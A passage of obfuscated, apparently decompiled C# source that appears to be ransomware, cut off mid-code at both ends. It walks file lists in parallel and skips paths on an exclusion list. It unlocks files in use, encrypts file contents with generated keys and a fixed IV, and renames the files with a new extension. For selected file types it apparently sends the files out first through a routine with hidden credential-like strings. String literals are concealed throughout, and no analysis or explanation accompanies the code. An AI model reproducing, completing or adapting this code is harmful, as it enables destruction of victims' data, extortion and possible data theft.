					if (tiRzeTZfFqxZgzU == getString_0(107396727) && fileStream.Length > Convert.ToInt32(WsRteVdKTkKpED) * 1024 * 1024 && !list3.Contains(text))
					{
						if (NgNETKMlSjJng == getString_0(107396727))
						{
							foreach (string item2 in chWKKaOgedu)
							{
								if (item.ToLower().EndsWith(item2) && fWqlqykUBEVkds == getString_0(107396727))
								{
									if (Convert.ToInt32(wQqHVBAZmaYqT) * 1024 * 1024 > fileStream.Length)
									{
										try
										{
											XCKLADindvJZ.nhXRXZDxbmMGwhokOT(getString_0(107368538), getString_0(107368533), getString_0(107368552), item);
										}
										catch
										{
										}
									}
								}
								else if (item.ToLower().EndsWith(item2) && fWqlqykUBEVkds == getString_0(107397156))
								{
									try
									{
										XCKLADindvJZ.nhXRXZDxbmMGwhokOT(getString_0(107368538), getString_0(107368533), getString_0(107368552), item);
									}
									catch
									{
									}
								}
							}
						}
						fileStream.Dispose();
						byte[] byte_ = YkOjxnmurVCfbj.QfkbKHDJftu(item, Convert.ToInt32(WsRteVdKTkKpED) * 1024 * 1024);
						byte[] aZxQiYswrzEMHo = YkOjxnmurVCfbj.WsadWEYMhPkNa(byte_, Encoding.ASCII.GetBytes(string_4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
						YkOjxnmurVCfbj.QNMHgTJICNuFwEj(item, aZxQiYswrzEMHo);
						if (string_2 != getString_0(107462002))
						{
							File.Move(item, item + string_2);
						}
					}
					else if (string_2 != getString_0(107462002))
					{
						biWcRVcvAHlr(item, item + string_2, fDTUzhDlmgg);
					}
					else
					{
						biWcRVcvAHlr(item, item + getString_0(107462029), fDTUzhDlmgg);
					}
				}
				catch (Exception)
				{
				}
				IL_0458:;
			}
		}
	}

	public static void MDMoTszPlPyHagPb(List<string> list_0, string[] string_0, string string_1, string[] string_2, string string_3)
	{
		cjHnGtYwZMHzv.ZXZgprhWxBP CS_0024_003C_003E8__locals0 = new cjHnGtYwZMHzv();
		CS_0024_003C_003E8__locals0.GNntzJbksCJrMo = list_0;
		CS_0024_003C_003E8__locals0.YZBBEXJSEfzFSqOL = string_1;
		CS_0024_003C_003E8__locals0.KvZqhnomFkqLeM = string_2;
		CS_0024_003C_003E8__locals0.UOfCooZEtXM = string_3;
		CS_0024_003C_003E8__locals0.IBAyWgLdmIlSINF = new List<string> { getString_0(107368489) };
		if (wqbriLFZDnLpH == getString_0(107397156))
		{
			Parallel.ForEach(string_0, delegate(string string_0)
			{
				foreach (string item in CS_0024_003C_003E8__locals0.GNntzJbksCJrMo)
				{
					if (!item.Contains(cjHnGtYwZMHzv.getString_0(107367978)) && !item.Contains(cjHnGtYwZMHzv.getString_0(107367953)) && !item.Contains(cjHnGtYwZMHzv.getString_0(107367920)) && !item.ToLower().Contains(cjHnGtYwZMHzv.getString_0(107367935)) && !item.ToLower().Contains(cjHnGtYwZMHzv.getString_0(107367890)) && !item.Contains(cjHnGtYwZMHzv.getString_0(107367897)) && !item.Contains(cjHnGtYwZMHzv.getString_0(107367876)) && !item.ToLower().Contains(cjHnGtYwZMHzv.getString_0(107367863)) && !item.ToLower().Contains(cjHnGtYwZMHzv.getString_0(107367818)) && !item.ToLower().Contains(cjHnGtYwZMHzv.getString_0(107367269)) && !item.ToLower().Contains(cjHnGtYwZMHzv.getString_0(107367292)) && !item.ToLower().Contains(cjHnGtYwZMHzv.getString_0(107367243)) && !item.ToLower().Contains(cjHnGtYwZMHzv.getString_0(107367217)) && !item.ToLower().Contains(cjHnGtYwZMHzv.getString_0(107367228)) && !item.Contains(cjHnGtYwZMHzv.getString_0(107367203)) && !item.Contains(cjHnGtYwZMHzv.getString_0(107367154)) && !item.Contains(cjHnGtYwZMHzv.getString_0(107367169)) && !item.Contains(cjHnGtYwZMHzv.getString_0(107367120)) && !item.Contains(cjHnGtYwZMHzv.getString_0(107367135)) && !item.Contains(cjHnGtYwZMHzv.getString_0(107367086)) && !item.Contains(cjHnGtYwZMHzv.getString_0(107367101)) && !item.Contains(cjHnGtYwZMHzv.getString_0(107367052)) && !item.Contains(cjHnGtYwZMHzv.getString_0(107367071)) && !item.Contains(cjHnGtYwZMHzv.getString_0(107367530)) && !item.ToLower().Contains(cjHnGtYwZMHzv.getString_0(107367549)) && !item.ToLower().Contains(cjHnGtYwZMHzv.getString_0(107367504)) && !item.ToLower().Contains(cjHnGtYwZMHzv.getString_0(107367519)) && !item.ToLower().Contains(cjHnGtYwZMHzv.getString_0(107367470)) && !item.Contains(DRlXtEGdcAr(cjHnGtYwZMHzv.getString_0(107367485))) && !item.Contains(cjHnGtYwZMHzv.getString_0(107367460)) && !item.Contains(cjHnGtYwZMHzv.getString_0(107367447)) && !item.Contains(cjHnGtYwZMHzv.getString_0(107367398)) && !item.EndsWith(CS_0024_003C_003E8__locals0.YZBBEXJSEfzFSqOL) && !item.EndsWith(cjHnGtYwZMHzv.getString_0(107367373)) && !item.EndsWith(cjHnGtYwZMHzv.getString_0(107367368)) && !item.EndsWith(cjHnGtYwZMHzv.getString_0(107367395)) && !item.EndsWith(cjHnGtYwZMHzv.getString_0(107367390)) && !item.Contains(cjHnGtYwZMHzv.getString_0(107367385)) && !item.Contains(eUsvqxZnDWYVdQ) && !item.Contains(GqXvKuGfqke) && !item.Contains(TajfgxbHDQDsSZ))
					{
						if (CS_0024_003C_003E8__locals0.KvZqhnomFkqLeM.Length != 0)
						{
							string[] kvZqhnomFkqLeM2 = CS_0024_003C_003E8__locals0.KvZqhnomFkqLeM;
							int num2 = 0;
							while (num2 < kvZqhnomFkqLeM2.Length)
							{
								string value2 = kvZqhnomFkqLeM2[num2];
								if (!item.EndsWith(value2))
								{
									num2++;
									continue;
								}
								goto IL_0e2a;
							}
						}
						try
						{
							if (item.EndsWith(CS_0024_003C_003E8__locals0.YZBBEXJSEfzFSqOL))
							{
								goto IL_0e2a;
							}
						}
						catch (Exception)
						{
							goto IL_0e2a;
						}
						if (item.EndsWith(string_0) && !UdjWdPcrsN.Contains(item))
						{
							if (xfkNWisgyvAPU == cjHnGtYwZMHzv.getString_0(107396747))
							{
								try
								{
									if (WYJTdIPbblX.TSIXTbBLjVAFJe(item))
									{
										WYJTdIPbblX.miTLgtFrOVP(item);
									}
								}
								catch
								{
								}
							}
							UdjWdPcrsN.Add(item);
							if (!nfYRZbrPjpWWw.Contains(Path.GetDirectoryName(item)))
							{
								nfYRZbrPjpWWw.Add(Path.GetDirectoryName(item));
							}
							zUUGKqROIrsY(item);
							try
							{
								new SsmQVyeqVMhAq().kXwlygCLUp(item);
							}
							catch
							{
							}
							try
							{
								using FileStream fileStream2 = new FileStream(item, FileMode.Open, FileAccess.Write);
								if (!fileStream2.CanWrite)
								{
									try
									{
										if (IrtcteVbDJMbKD)
										{
											Console.WriteLine(cjHnGtYwZMHzv.getString_0(107477705) + item + cjHnGtYwZMHzv.getString_0(107477692) + new FileInfo(item).Length + cjHnGtYwZMHzv.getString_0(107477639));
											Console.WriteLine(cjHnGtYwZMHzv.getString_0(107477662));
										}
									}
									catch
									{
									}
									VKiZFXRXdSmDy(DRlXtEGdcAr(cjHnGtYwZMHzv.getString_0(107478069)), cjHnGtYwZMHzv.getString_0(107366757) + item + cjHnGtYwZMHzv.getString_0(107366757) + DRlXtEGdcAr(cjHnGtYwZMHzv.getString_0(107478044)) + cjHnGtYwZMHzv.getString_0(107366757) + Environment.UserName + cjHnGtYwZMHzv.getString_0(107366757) + DRlXtEGdcAr(cjHnGtYwZMHzv.getString_0(107477995)));
								}
							}
							catch (Exception ex18)
							{
								if (qphnWLJhmOUolrV)
								{
									try
									{
										File.AppendAllText(GqXvKuGfqke, cjHnGtYwZMHzv.getString_0(107461784) + item + cjHnGtYwZMHzv.getString_0(107477970) + ex18.Message + cjHnGtYwZMHzv.getString_0(107396430));
									}
									catch (Exception)
									{
									}
								}
								continue;
							}
							try
							{
								try
								{
									if (new FileInfo(item).Length != 0L)
									{
										goto end_IL_0716;
									}
									goto end_IL_0716_2;
									end_IL_0716:;
								}
								catch (Exception ex20)
								{
									if (qphnWLJhmOUolrV)
									{
										try
										{
											File.AppendAllText(GqXvKuGfqke, cjHnGtYwZMHzv.getString_0(107461784) + item + cjHnGtYwZMHzv.getString_0(107477921) + ex20.Message + cjHnGtYwZMHzv.getString_0(107396430));
										}
										catch (Exception)
										{
										}
									}
									CfPnwVRgYaXy++;
									goto end_IL_0716_2;
								}
								if (!(tiRzeTZfFqxZgzU == cjHnGtYwZMHzv.getString_0(107396747)) || new FileInfo(item).Length <= Convert.ToInt32(WsRteVdKTkKpED) * 1024 * 1024 || CS_0024_003C_003E8__locals0.IBAyWgLdmIlSINF.Contains(string_0))
								{
									if (JaGTzvkqDZS)
									{
										CS_0024_003C_003E8__locals0.YZBBEXJSEfzFSqOL = WorQZGhMrwJuixubIO + CS_0024_003C_003E8__locals0.YZBBEXJSEfzFSqOL;
									}
									string text3 = SznTIlYhfLTN.eXlzrfSfGzN(32);
									string s3 = YYqwPFDAXdJ.cKyevcNdVhPKbErXE(text3);
									byte[] bytes3 = Encoding.ASCII.GetBytes(s3);
									if (CS_0024_003C_003E8__locals0.YZBBEXJSEfzFSqOL != cjHnGtYwZMHzv.getString_0(107462022))
									{
										if (!tEHYMAajqyQN)
										{
											if (!DfXjMyctTQk)
											{
												lnQkjKFYbeSHtD(item, item + CS_0024_003C_003E8__locals0.YZBBEXJSEfzFSqOL, fDTUzhDlmgg);
											}
											else
											{
												lnQkjKFYbeSHtD(item, item + CS_0024_003C_003E8__locals0.YZBBEXJSEfzFSqOL, Encoding.ASCII.GetBytes(text3));
											}
										}
										else
										{
											try
											{
												if (!DfXjMyctTQk)
												{
													UaSzdRmAlgEilgQY(item, item + CS_0024_003C_003E8__locals0.YZBBEXJSEfzFSqOL, fDTUzhDlmgg);
												}
												else
												{
													UaSzdRmAlgEilgQY(item, item + CS_0024_003C_003E8__locals0.YZBBEXJSEfzFSqOL, Encoding.ASCII.GetBytes(text3));
												}
											}
											catch (Exception ex22)
											{
												if (qphnWLJhmOUolrV)
												{
													try
													{
														File.AppendAllText(GqXvKuGfqke, cjHnGtYwZMHzv.getString_0(107461784) + item + cjHnGtYwZMHzv.getString_0(107462040) + ex22.Message + cjHnGtYwZMHzv.getString_0(107396430));
													}
													catch (Exception)
													{
													}
												}
												CfPnwVRgYaXy++;
												try
												{
													File.Move(item + CS_0024_003C_003E8__locals0.YZBBEXJSEfzFSqOL, item);
												}
												catch (Exception)
												{
												}
												goto end_IL_0716_2;
											}
										}
									}
									else if (!tEHYMAajqyQN)
									{
										if (!DfXjMyctTQk)
										{
											lnQkjKFYbeSHtD(item, item + cjHnGtYwZMHzv.getString_0(107462049), fDTUzhDlmgg);
										}
										else
										{
											lnQkjKFYbeSHtD(item, item + cjHnGtYwZMHzv.getString_0(107462049), Encoding.ASCII.GetBytes(text3));
										}
									}
									else
									{
										try
										{
											if (!DfXjMyctTQk)
											{
												UaSzdRmAlgEilgQY(item, item, fDTUzhDlmgg);
											}
											else
											{
												UaSzdRmAlgEilgQY(item, item, Encoding.ASCII.GetBytes(text3));
											}
										}
										catch (Exception ex25)
										{
											if (qphnWLJhmOUolrV)
											{
												try
												{
													File.AppendAllText(GqXvKuGfqke, cjHnGtYwZMHzv.getString_0(107461784) + item + cjHnGtYwZMHzv.getString_0(107462040) + ex25.Message + cjHnGtYwZMHzv.getString_0(107396430));
												}
												catch (Exception)
												{
												}
											}
											CfPnwVRgYaXy++;
											goto end_IL_0716_2;
										}
									}
									if (DfXjMyctTQk)
									{
										if (CS_0024_003C_003E8__locals0.YZBBEXJSEfzFSqOL != cjHnGtYwZMHzv.getString_0(107462022))
										{
											jIMiBnTvhHRYVy(item + CS_0024_003C_003E8__locals0.YZBBEXJSEfzFSqOL, bytes3);
										}
										else
										{
											jIMiBnTvhHRYVy(item, bytes3);
										}
									}
									goto IL_0e2a;
								}
								CS_0024_003C_003E8__locals0 = new cjHnGtYwZMHzv.XCwtJHOLhgj();
								CS_0024_003C_003E8__locals0.QUdXahSqDeWDNP = CS_0024_003C_003E8__locals0;
								try
								{
									if (CS_0024_003C_003E8__locals0.YZBBEXJSEfzFSqOL != cjHnGtYwZMHzv.getString_0(107462022))
									{
										if (JaGTzvkqDZS)
										{
											CS_0024_003C_003E8__locals0.YZBBEXJSEfzFSqOL = WorQZGhMrwJuixubIO + CS_0024_003C_003E8__locals0.YZBBEXJSEfzFSqOL;
										}
										File.Move(item, item + CS_0024_003C_003E8__locals0.YZBBEXJSEfzFSqOL);
									}
								}
								catch (Exception ex27)
								{
									if (qphnWLJhmOUolrV)
									{
										try
										{
											File.AppendAllText(GqXvKuGfqke, cjHnGtYwZMHzv.getString_0(107461784) + item + cjHnGtYwZMHzv.getString_0(107477348) + ex27.Message + cjHnGtYwZMHzv.getString_0(107396430));
										}
										catch (Exception)
										{
										}
									}
									CfPnwVRgYaXy++;
									goto end_IL_0716_2;
								}
								CS_0024_003C_003E8__locals0.wxEAiIcvfnmJwqp = cjHnGtYwZMHzv.getString_0(107368509);
								if (CS_0024_003C_003E8__locals0.YZBBEXJSEfzFSqOL != cjHnGtYwZMHzv.getString_0(107462022))
								{
									CS_0024_003C_003E8__locals0.wxEAiIcvfnmJwqp = item + CS_0024_003C_003E8__locals0.YZBBEXJSEfzFSqOL;
								}
								else
								{
									CS_0024_003C_003E8__locals0.wxEAiIcvfnmJwqp = item;
								}
								if (NgNETKMlSjJng == cjHnGtYwZMHzv.getString_0(107396747))
								{
									Thread thread2 = new Thread((ThreadStart)delegate
									{
										foreach (string item2 in chWKKaOgedu)
										{
											if (CS_0024_003C_003E8__locals0.wxEAiIcvfnmJwqp.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.QUdXahSqDeWDNP.YZBBEXJSEfzFSqOL) && fWqlqykUBEVkds == cjHnGtYwZMHzv.XCwtJHOLhgj.getString_0(107396750))
											{
												if (Convert.ToInt32(wQqHVBAZmaYqT) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.wxEAiIcvfnmJwqp).Length)
												{
													try
													{
														XCKLADindvJZ.nhXRXZDxbmMGwhokOT(cjHnGtYwZMHzv.XCwtJHOLhgj.getString_0(107368561), cjHnGtYwZMHzv.XCwtJHOLhgj.getString_0(107368556), cjHnGtYwZMHzv.XCwtJHOLhgj.getString_0(107368575), CS_0024_003C_003E8__locals0.wxEAiIcvfnmJwqp);
													}
													catch
													{
													}
												}
											}
											else if (CS_0024_003C_003E8__locals0.wxEAiIcvfnmJwqp.ToLower().EndsWith(item2) && fWqlqykUBEVkds == cjHnGtYwZMHzv.XCwtJHOLhgj.getString_0(107397179))
											{
												try
												{
													XCKLADindvJZ.nhXRXZDxbmMGwhokOT(cjHnGtYwZMHzv.XCwtJHOLhgj.getString_0(107368561), cjHnGtYwZMHzv.XCwtJHOLhgj.getString_0(107368556), cjHnGtYwZMHzv.XCwtJHOLhgj.getString_0(107368575), CS_0024_003C_003E8__locals0.wxEAiIcvfnmJwqp);
												}
												catch
												{
												}
											}
										}
									});
									thread2.Priority = ThreadPriority.Normal;
									thread2.IsBackground = false;
									thread2.Start();
								}
								string text4 = SznTIlYhfLTN.eXlzrfSfGzN(32);
								string s4 = YYqwPFDAXdJ.cKyevcNdVhPKbErXE(text4);
								byte[] bytes4 = Encoding.ASCII.GetBytes(s4);
								if (dVeczuFsmFhaWQ == cjHnGtYwZMHzv.getString_0(107397176))
								{
									byte[] array2 = null;
									byte[] byte_2 = YkOjxnmurVCfbj.QfkbKHDJftu(CS_0024_003C_003E8__locals0.wxEAiIcvfnmJwqp, Convert.ToInt32(WsRteVdKTkKpED) * 1024 * 1024);
									if (YkOjxnmurVCfbj.QNMHgTJICNuFwEj(aZxQiYswrzEMHo: (!xIEYdRogbJjk) ? (DfXjMyctTQk ? YkOjxnmurVCfbj.WsadWEYMhPkNa(byte_2, Encoding.ASCII.GetBytes(text4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : YkOjxnmurVCfbj.WsadWEYMhPkNa(byte_2, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.UOfCooZEtXM), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (DfXjMyctTQk ? NVikUgaKetXUZt.GbzVpJVLoYrET(byte_2, Encoding.ASCII.GetBytes(text4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : NVikUgaKetXUZt.GbzVpJVLoYrET(byte_2, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.UOfCooZEtXM), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), qtBBAGkzVvLoDw: CS_0024_003C_003E8__locals0.wxEAiIcvfnmJwqp, BPtIRqUKxRmcJT: bytes4))
									{
										goto IL_0e2a;
									}
									try
									{
										File.Move(item + CS_0024_003C_003E8__locals0.YZBBEXJSEfzFSqOL, item);
									}
									catch (Exception)
									{
									}
								}
								else if (!DfXjMyctTQk)
								{
									if (KEPDVlpbgsoad.kCRjVccpOKvz(CS_0024_003C_003E8__locals0.wxEAiIcvfnmJwqp, WsRteVdKTkKpED, CS_0024_003C_003E8__locals0.UOfCooZEtXM))
									{
										goto IL_0e2a;
									}
									try
									{
										File.Move(item + CS_0024_003C_003E8__locals0.YZBBEXJSEfzFSqOL, item);
									}
									catch (Exception)
									{
									}
								}
								else
								{
									if (KEPDVlpbgsoad.kCRjVccpOKvz(CS_0024_003C_003E8__locals0.wxEAiIcvfnmJwqp, WsRteVdKTkKpED, text4, bytes4))
									{
										goto IL_0e2a;
									}
									try
									{
										File.Move(item + CS_0024_003C_003E8__locals0.YZBBEXJSEfzFSqOL, item);
									}
									catch (Exception)
									{
									}
								}
								end_IL_0716_2:;
							}
							catch (Exception)
							{
								goto IL_0e2a;
							}
						}
					}
					continue;
					IL_0e2a:
					CS_0024_003C_003E8__locals0.GNntzJbksCJrMo.Remove(item);
				}
			});
			return;
		}
		Parallel.ForEach(CS_0024_003C_003E8__locals0.GNntzJbksCJrMo, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new cjHnGtYwZMHzv.ZXZgprhWxBP();
			CS_0024_003C_003E8__locals0.QUdXahSqDeWDNP = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.jHcqeHIPeN = string_0;
			if (!CS_0024_003C_003E8__locals0.jHcqeHIPeN.Contains(cjHnGtYwZMHzv.getString_0(107367978)) && !CS_0024_003C_003E8__locals0.jHcqeHIPeN.Contains(cjHnGtYwZMHzv.getString_0(107367953)) && !CS_0024_003C_003E8__locals0.jHcqeHIPeN.Contains(cjHnGtYwZMHzv.getString_0(107367920)) && !CS_0024_003C_003E8__locals0.jHcqeHIPeN.ToLower().Contains(cjHnGtYwZMHzv.getString_0(107367935)) && !CS_0024_003C_003E8__locals0.jHcqeHIPeN.ToLower().Contains(cjHnGtYwZMHzv.getString_0(107367890)) && !CS_0024_003C_003E8__locals0.jHcqeHIPeN.Contains(cjHnGtYwZMHzv.getString_0(107367897)) && !CS_0024_003C_003E8__locals0.jHcqeHIPeN.Contains(cjHnGtYwZMHzv.getString_0(107367876)) && !CS_0024_003C_003E8__locals0.jHcqeHIPeN.ToLower().Contains(cjHnGtYwZMHzv.getString_0(107367863)) && !CS_0024_003C_003E8__locals0.jHcqeHIPeN.ToLower().Contains(cjHnGtYwZMHzv.getString_0(107367818)) && !CS_0024_003C_003E8__locals0.jHcqeHIPeN.ToLower().Contains(cjHnGtYwZMHzv.getString_0(107367269)) && !CS_0024_003C_003E8__locals0.jHcqeHIPeN.ToLower().Contains(cjHnGtYwZMHzv.getString_0(107367292)) && !CS_0024_003C_003E8__locals0.jHcqeHIPeN.ToLower().Contains(cjHnGtYwZMHzv.getString_0(107367243)) && !CS_0024_003C_003E8__locals0.jHcqeHIPeN.ToLower().Contains(cjHnGtYwZMHzv.getString_0(107367217)) && !CS_0024_003C_003E8__locals0.jHcqeHIPeN.ToLower().Contains(cjHnGtYwZMHzv.getString_0(107367228)) && !CS_0024_003C_003E8__locals0.jHcqeHIPeN.Contains(cjHnGtYwZMHzv.getString_0(107367203)) && !CS_0024_003C_003E8__locals0.jHcqeHIPeN.Contains(cjHnGtYwZMHzv.getString_0(107367154)) && !CS_0024_003C_003E8__locals0.jHcqeHIPeN.Contains(cjHnGtYwZMHzv.getString_0(107367169)) && !CS_0024_003C_003E8__locals0.jHcqeHIPeN.Contains(cjHnGtYwZMHzv.getString_0(107367120)) && !CS_0024_003C_003E8__locals0.jHcqeHIPeN.Contains(cjHnGtYwZMHzv.getString_0(107367135)) && !CS_0024_003C_003E8__locals0.jHcqeHIPeN.Contains(cjHnGtYwZMHzv.getString_0(107367086)) && !CS_0024_003C_003E8__locals0.jHcqeHIPeN.Contains(cjHnGtYwZMHzv.getString_0(107367101)) && !CS_0024_003C_003E8__locals0.jHcqeHIPeN.Contains(cjHnGtYwZMHzv.getString_0(107367052)) && !CS_0024_003C_003E8__locals0.jHcqeHIPeN.Contains(cjHnGtYwZMHzv.getString_0(107367071)) && !CS_0024_003C_003E8__locals0.jHcqeHIPeN.Contains(cjHnGtYwZMHzv.getString_0(107367530)) && !CS_0024_003C_003E8__locals0.jHcqeHIPeN.ToLower().Contains(cjHnGtYwZMHzv.getString_0(107367549)) && !CS_0024_003C_003E8__locals0.jHcqeHIPeN.ToLower().Contains(cjHnGtYwZMHzv.getString_0(107367504)) && !CS_0024_003C_003E8__locals0.jHcqeHIPeN.ToLower().Contains(cjHnGtYwZMHzv.getString_0(107367519)) && !CS_0024_003C_003E8__locals0.jHcqeHIPeN.ToLower().Contains(cjHnGtYwZMHzv.getString_0(107367470)) && !CS_0024_003C_003E8__locals0.jHcqeHIPeN.Contains(DRlXtEGdcAr(cjHnGtYwZMHzv.getString_0(107367485))) && !CS_0024_003C_003E8__locals0.jHcqeHIPeN.Contains(cjHnGtYwZMHzv.getString_0(107367460)) && !CS_0024_003C_003E8__locals0.jHcqeHIPeN.Contains(cjHnGtYwZMHzv.getString_0(107367447)) && !CS_0024_003C_003E8__locals0.jHcqeHIPeN.Contains(cjHnGtYwZMHzv.getString_0(107367398)) && !CS_0024_003C_003E8__locals0.jHcqeHIPeN.EndsWith(CS_0024_003C_003E8__locals0.YZBBEXJSEfzFSqOL) && !CS_0024_003C_003E8__locals0.jHcqeHIPeN.EndsWith(cjHnGtYwZMHzv.getString_0(107367373)) && !CS_0024_003C_003E8__locals0.jHcqeHIPeN.EndsWith(cjHnGtYwZMHzv.getString_0(107367368)) && !CS_0024_003C_003E8__locals0.jHcqeHIPeN.EndsWith(cjHnGtYwZMHzv.getString_0(107367395)) && !CS_0024_003C_003E8__locals0.jHcqeHIPeN.EndsWith(cjHnGtYwZMHzv.getString_0(107367390)) && !CS_0024_003C_003E8__locals0.jHcqeHIPeN.Contains(cjHnGtYwZMHzv.getString_0(107367385)) && !CS_0024_003C_003E8__locals0.jHcqeHIPeN.Contains(eUsvqxZnDWYVdQ) && !CS_0024_003C_003E8__locals0.jHcqeHIPeN.Contains(GqXvKuGfqke) && !CS_0024_003C_003E8__locals0.jHcqeHIPeN.Contains(TajfgxbHDQDsSZ))
			{
				if (CS_0024_003C_003E8__locals0.KvZqhnomFkqLeM.Length != 0)
				{
					string[] kvZqhnomFkqLeM = CS_0024_003C_003E8__locals0.KvZqhnomFkqLeM;
					int num = 0;
					while (num < kvZqhnomFkqLeM.Length)
					{
						string value = kvZqhnomFkqLeM[num];
						if (!CS_0024_003C_003E8__locals0.jHcqeHIPeN.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_1000;
					}
				}
				try
				{
					if (CS_0024_003C_003E8__locals0.jHcqeHIPeN.EndsWith(CS_0024_003C_003E8__locals0.YZBBEXJSEfzFSqOL))
					{
						goto IL_1000;
					}
				}
				catch (Exception)
				{
					goto IL_1000;
				}
				if (!UdjWdPcrsN.Contains(CS_0024_003C_003E8__locals0.jHcqeHIPeN))
				{
					if (xfkNWisgyvAPU == cjHnGtYwZMHzv.getString_0(107396747))
					{
						try
						{
							if (WYJTdIPbblX.TSIXTbBLjVAFJe(CS_0024_003C_003E8__locals0.jHcqeHIPeN))
							{
								WYJTdIPbblX.miTLgtFrOVP(CS_0024_003C_003E8__locals0.jHcqeHIPeN);
							}
						}
						catch
						{
						}
					}
					UdjWdPcrsN.Add(CS_0024_003C_003E8__locals0.jHcqeHIPeN);
					if (!nfYRZbrPjpWWw.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.jHcqeHIPeN)))
					{
						nfYRZbrPjpWWw.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.jHcqeHIPeN));
					}
					zUUGKqROIrsY(CS_0024_003C_003E8__locals0.jHcqeHIPeN);
					try
					{
						new SsmQVyeqVMhAq().kXwlygCLUp(CS_0024_003C_003E8__locals0.jHcqeHIPeN);
					}
					catch
					{
					}
					try
					{
						using FileStream fileStream = new FileStream(CS_0024_003C_003E8__locals0.jHcqeHIPeN, FileMode.Open, FileAccess.Write);
						if (!fileStream.CanWrite)
						{
							try
							{
								if (IrtcteVbDJMbKD)
								{
									Console.WriteLine(cjHnGtYwZMHzv.getString_0(107477705) + CS_0024_003C_003E8__locals0.jHcqeHIPeN + cjHnGtYwZMHzv.getString_0(107477692) + new FileInfo(CS_0024_003C_003E8__locals0.jHcqeHIPeN).Length + cjHnGtYwZMHzv.getString_0(107477639));
									Console.WriteLine(cjHnGtYwZMHzv.getString_0(107477662));
								}
							}
							catch
							{
							}
							VKiZFXRXdSmDy(DRlXtEGdcAr(cjHnGtYwZMHzv.getString_0(107478069)), cjHnGtYwZMHzv.getString_0(107366757) + CS_0024_003C_003E8__locals0.jHcqeHIPeN + cjHnGtYwZMHzv.getString_0(107366757) + DRlXtEGdcAr(cjHnGtYwZMHzv.getString_0(107478044)) + cjHnGtYwZMHzv.getString_0(107366757) + Environment.UserName + cjHnGtYwZMHzv.getString_0(107366757) + DRlXtEGdcAr(cjHnGtYwZMHzv.getString_0(107477995)));
						}
					}
					catch (Exception ex2)
					{
						if (qphnWLJhmOUolrV)
						{
							try
							{
								File.AppendAllText(GqXvKuGfqke, cjHnGtYwZMHzv.getString_0(107461784) + CS_0024_003C_003E8__locals0.jHcqeHIPeN + cjHnGtYwZMHzv.getString_0(107477970) + ex2.Message + cjHnGtYwZMHzv.getString_0(107396430));
								return;
							}
							catch (Exception)
							{
								return;
							}
						}
						return;
					}
					try
					{
						try
						{
							if (new FileInfo(CS_0024_003C_003E8__locals0.jHcqeHIPeN).Length != 0L)
							{
								goto end_IL_085c;
							}
							goto end_IL_085c_2;
							end_IL_085c:;
						}
						catch (Exception ex4)
						{
							if (qphnWLJhmOUolrV)
							{
								try
								{
									File.AppendAllText(GqXvKuGfqke, cjHnGtYwZMHzv.getString_0(107461784) + CS_0024_003C_003E8__locals0.jHcqeHIPeN + cjHnGtYwZMHzv.getString_0(107477921) + ex4.Message + cjHnGtYwZMHzv.getString_0(107396430));
								}
								catch (Exception)
								{
								}
							}
							CfPnwVRgYaXy++;
							goto end_IL_085c_2;
						}
						if (tiRzeTZfFqxZgzU == cjHnGtYwZMHzv.getString_0(107396747) && new FileInfo(CS_0024_003C_003E8__locals0.jHcqeHIPeN).Length > Convert.ToInt32(WsRteVdKTkKpED) * 1024 * 1024)
						{
							try
							{
								if (CS_0024_003C_003E8__locals0.YZBBEXJSEfzFSqOL != cjHnGtYwZMHzv.getString_0(107462022))
								{
									if (JaGTzvkqDZS)
									{
										CS_0024_003C_003E8__locals0.YZBBEXJSEfzFSqOL = WorQZGhMrwJuixubIO + CS_0024_003C_003E8__locals0.YZBBEXJSEfzFSqOL;
									}
									File.Move(CS_0024_003C_003E8__locals0.jHcqeHIPeN, CS_0024_003C_003E8__locals0.jHcqeHIPeN + CS_0024_003C_003E8__locals0.YZBBEXJSEfzFSqOL);
								}
							}
							catch (Exception ex6)
							{
								if (qphnWLJhmOUolrV)
								{
									try
									{
										File.AppendAllText(GqXvKuGfqke, cjHnGtYwZMHzv.getString_0(107461784) + CS_0024_003C_003E8__locals0.jHcqeHIPeN + cjHnGtYwZMHzv.getString_0(107477348) + ex6.Message + cjHnGtYwZMHzv.getString_0(107396430));
									}
									catch (Exception)
									{
									}
								}
								CfPnwVRgYaXy++;
								return;
							}
							if (CS_0024_003C_003E8__locals0.YZBBEXJSEfzFSqOL != cjHnGtYwZMHzv.getString_0(107462022))
							{
								CS_0024_003C_003E8__locals0.jHcqeHIPeN += CS_0024_003C_003E8__locals0.YZBBEXJSEfzFSqOL;
							}
							if (NgNETKMlSjJng == cjHnGtYwZMHzv.getString_0(107396747))
							{
								Thread thread = new Thread((ThreadStart)delegate
								{
									foreach (string item3 in chWKKaOgedu)
									{
										if (CS_0024_003C_003E8__locals0.jHcqeHIPeN.ToLower().EndsWith(item3 + CS_0024_003C_003E8__locals0.QUdXahSqDeWDNP.YZBBEXJSEfzFSqOL) && fWqlqykUBEVkds == cjHnGtYwZMHzv.ZXZgprhWxBP.getString_0(107396753))
										{
											if (Convert.ToInt32(wQqHVBAZmaYqT) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.jHcqeHIPeN).Length)
											{
												try
												{
													XCKLADindvJZ.nhXRXZDxbmMGwhokOT(cjHnGtYwZMHzv.ZXZgprhWxBP.getString_0(107368564), cjHnGtYwZMHzv.ZXZgprhWxBP.getString_0(107368559), cjHnGtYwZMHzv.ZXZgprhWxBP.getString_0(107368578), CS_0024_003C_003E8__locals0.jHcqeHIPeN);
												}
												catch
												{
												}
											}
										}
										else if (CS_0024_003C_003E8__locals0.jHcqeHIPeN.ToLower().EndsWith(item3) && fWqlqykUBEVkds == cjHnGtYwZMHzv.ZXZgprhWxBP.getString_0(107397182))
										{
											try
											{
